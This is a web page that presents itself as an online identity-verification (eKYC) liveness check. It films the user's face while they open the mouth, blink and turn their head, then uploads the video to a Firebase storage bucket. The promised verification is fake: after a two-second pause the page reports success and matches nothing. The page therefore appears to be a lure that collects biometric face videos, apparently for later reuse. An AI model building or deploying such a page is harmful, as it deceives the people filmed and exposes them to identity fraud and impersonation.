<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>オンライン本人確認システム (eKYC)</title>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
  <style>
    body {
      font-family: 'Helvetica Neue', Arial, sans-serif;
      background-color: #f5f5f7; color: #333;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      min-height: 100dvh; margin: 0; padding: 20px; box-sizing: border-box; overflow: hidden;
    }
    .header-title { font-size: 1.3rem; font-weight: bold; margin-bottom: 30px; color: #1d1d1f; }
    .container {
      position: relative; width: 80vw; max-width: 320px; aspect-ratio: 1 / 1; 
      background: #e5e5ea; border: 6px solid #fff; border-radius: 50%;
      overflow: hidden; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); margin-bottom: 30px;
    }
    video, #output_canvas {
      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
      object-fit: cover; transform: scaleX(-1);
    }
    #record_canvas { display: none; }
    .instruction-box {
      background: #ffffff; padding: 15px 20px; width: 90%; max-width: 400px;
      border-radius: 15px; text-align: center; font-size: 1.1rem; font-weight: bold;
      color: #0071e3; box-shadow: 0 4px 15px rgba(0,0,0,0.05); box-sizing: border-box;
      line-height: 1.4; min-height: 80px; display: flex; align-items: center; justify-content: center;
    }
    #retry-btn {
      display: none; margin-top: 20px; padding: 10px 25px; background-color: transparent;
      color: #0071e3; border: 2px solid #0071e3; border-radius: 20px; font-size: 0.95rem;
      font-weight: bold; cursor: pointer;
    }
    /* 利用規約モーダル */
    #tos-modal {
      position: fixed; top: 0; left: 0; width: 100vw; height: 100dvh;
      background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(5px);
      display: flex; align-items: center; justify-content: center; z-index: 100;
    }
    .tos-content {
      background: #fff; width: 85%; max-width: 350px; padding: 30px 20px;
      border-radius: 20px; display: flex; flex-direction: column; align-items: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
    }
    .tos-link { color: #0071e3; text-decoration: underline; cursor: pointer; }
    #start-btn { 
      background: #0071e3; color: #fff; border: none; padding: 15px; width: 100%; 
      border-radius: 12px; font-weight: bold; font-size: 1rem; cursor: pointer; margin-top: 10px;
    }
    #start-btn:disabled { background: #cccccc; cursor: not-allowed; }
    .tos-label { display: flex; align-items: center; margin-bottom: 25px; font-size: 0.95rem; cursor: pointer; }
    .tos-label input { width: 20px; height: 20px; margin-right: 10px; }
  </style>
</head>
<body>

  <div id="tos-modal">
    <div class="tos-content">
      <div style="font-weight:bold; font-size: 1.2rem; margin-bottom:15px;">本人確認の開始</div>
      <div style="font-size:0.9rem; color:#666; margin-bottom:25px; text-align:center; line-height:1.5;">
        お手続きを進めるには、以下の規約をご確認の上、「同意する」にチェックを入れてください。
      </div>
      
      <label class="tos-label">
        <input type="checkbox" id="tos-agree"> 
        <span><a href="tos.html" target="_blank" class="tos-link">利用規約</a>に同意する</span>
      </label>

      <button id="start-btn" disabled>次へ進む</button>
    </div>
  </div>

  <div class="header-title">本人確認（生体検知）</div>
  <div class="container">
    <video id="input_video" autoplay playsinline muted></video>
    <canvas id="output_canvas"></canvas>
  </div>
  <canvas id="record_canvas" width="720" height="1280"></canvas>
  <div id="instruction" class="instruction-box">カメラを起動中...</div>
  <button id="retry-btn">やり直す</button>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBvZ7is4vZ8SNBZFh9ZvhnGQLJkdyckfq0",
      authDomain: "face-recognition-10988.firebaseapp.com",
      projectId: "face-recognition-10988",
      storageBucket: "face-recognition-10988.firebasestorage.app",
      messagingSenderId: "343636515056",
      appId: "1:343636515056:web:14e9b9a9e004d941218a35"
    };

    const app = initializeApp(firebaseConfig);
    const storage = getStorage(app);

    const videoElement = document.getElementById('input_video');
    const canvasElement = document.getElementById('output_canvas');
    const canvasCtx = canvasElement.getContext('2d');
    const recordCanvas = document.getElementById('record_canvas');
    const recordCtx = recordCanvas.getContext('2d');
    const instructionText = document.getElementById('instruction');
    const retryBtn = document.getElementById('retry-btn');

    let isRecording = false; 
    let mediaRecorder; 
    let recordedChunks = []; 
    let currentStep = 0;
    let actionStartTime = null; 
    let blinkState = "open";

    function startRecording() {
      if (isRecording) return;
      isRecording = true;
      recordedChunks = [];
      recordCanvas.width = 720;
      recordCanvas.height = 1280;
      const stream = recordCanvas.captureStream(30); 
      const types = ['video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
      let selectedType = types.find(type => MediaRecorder.isTypeSupported(type));
      mediaRecorder = new MediaRecorder(stream, { mimeType: selectedType, videoBitsPerSecond: 2500000 });
      mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
      mediaRecorder.onstop = async () => {
        if (recordedChunks.length === 0) return;
        const blob = new Blob(recordedChunks, { type: selectedType });
        const fileName = `auth_video_${Date.now()}.webm`;
        const storageRef = ref(storage, 'secure_auth_data/' + fileName);
        try { await uploadBytes(storageRef, blob); } catch (e) { console.error(e); }
      };
      mediaRecorder.start(); 
    }

    function onResults(results) {
      canvasElement.width = videoElement.videoWidth; 
      canvasElement.height = videoElement.videoHeight;
      canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
      const targetW = 720; const targetH = 1280;
      recordCtx.clearRect(0, 0, targetW, targetH);
      const videoAspect = videoElement.videoWidth / videoElement.videoHeight;
      const targetAspect = targetW / targetH;
      let drawW, drawH, drawX, drawY;
      if (videoAspect > targetAspect) {
        drawH = targetH; drawW = targetH * videoAspect; drawX = (targetW - drawW) / 2; drawY = 0;
      } else {
        drawW = targetW; drawH = targetW / videoAspect; drawX = 0; drawY = (targetH - drawH) / 2;
      }
      recordCtx.drawImage(videoElement, drawX, drawY, drawW, drawH);

      if (results.multiFaceLandmarks && results.multiFaceLandmarks.length > 0) {
        if (!isRecording) startRecording();
        const landmarks = results.multiFaceLandmarks[0];
        if (currentStep === 0) {
          instructionText.innerText = "認証を開始します。\n口を大きく開けてください";
          const mouthOpenDist = Math.abs(landmarks[13].y - landmarks[14].y);
          if (mouthOpenDist > 0.07) { 
            if (!actionStartTime) actionStartTime = Date.now();
            let remaining = Math.ceil((3000 - (Date.now() - actionStartTime)) / 1000);
            if (remaining > 0) { instructionText.innerText = `そのままキープ！\n（あと ${remaining} 秒）`; }
            else { currentStep = 1; actionStartTime = null; instructionText.innerText = "OK！次にまばたきを1回してください"; }
          } else { actionStartTime = null; }
        } else if (currentStep === 1) {
          const leftEye = Math.abs(landmarks[159].y - landmarks[145].y);
          const rightEye = Math.abs(landmarks[386].y - landmarks[374].y);
          if (leftEye < 0.015 && rightEye < 0.015) { blinkState = "closed"; } 
          else if (blinkState === "closed" && leftEye > 0.02) { currentStep = 2; instructionText.innerText = "OK！ゆっくり右を向いてください"; }
        } else if (currentStep === 2) {
          const ratio = (landmarks[1].x - landmarks[234].x) / (landmarks[454].x - landmarks[234].x);
          if (ratio < 0.25) { currentStep = 3; instructionText.innerText = "OK！ゆっくり左を向いてください"; }
        } else if (currentStep === 3) {
          const ratio = (landmarks[1].x - landmarks[234].x) / (landmarks[454].x - landmarks[234].x);
          if (ratio > 0.75) { 
            currentStep = 4; instructionText.innerText = "照合中...";
            setTimeout(() => { 
              if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
              instructionText.innerText = "認証完了！ありがとうございました。";
              isRecording = false;
            }, 2000);
          }
        }
      }
    }

    const startBtn = document.getElementById('start-btn');
    document.getElementById('tos-agree').addEventListener('change', e => startBtn.disabled = !e.target.checked);
    startBtn.addEventListener('click', () => {
      document.getElementById('tos-modal').style.display = 'none';
      const faceMesh = new FaceMesh({locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`});
      faceMesh.setOptions({ maxNumFaces: 1, refineLandmarks: true, minDetectionConfidence: 0.5 });
      faceMesh.onResults(onResults);
      const camera = new Camera(videoElement, {
        onFrame: async () => { await faceMesh.send({image: videoElement}); },
        facingMode: 'user', width: 1280, height: 720
      });
      camera.start();
      instructionText.innerText = "枠内に顔を収めてください";
    });
  </script>
</body>
</html>
